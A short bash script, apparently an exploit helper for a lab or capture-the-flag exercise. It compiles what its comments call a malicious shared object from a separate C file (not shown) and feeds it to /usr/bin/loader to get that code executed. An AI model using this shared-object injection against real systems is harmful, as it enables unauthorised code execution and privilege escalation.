#!/bin/bash

# Variables
OUTPUT_SO="/tmp/myplugin.so"
LOADER="/usr/bin/loader"  # Adjust if your loader is somewhere else

# Compile the malicious shared object
echo "[*] Compiling malicious shared object..."
gcc -fPIC -shared -o "$OUTPUT_SO" myplugin.c

# Verify compilation success
if [ $? -ne 0 ]; then
    echo "[!] Compilation failed."
    exit 1
fi
echo "[+] Compilation successful. Output: $OUTPUT_SO"

# Run the loader with the shared object
echo "[*] Running loader with shared object..."
"$LOADER" "$OUTPUT_SO"
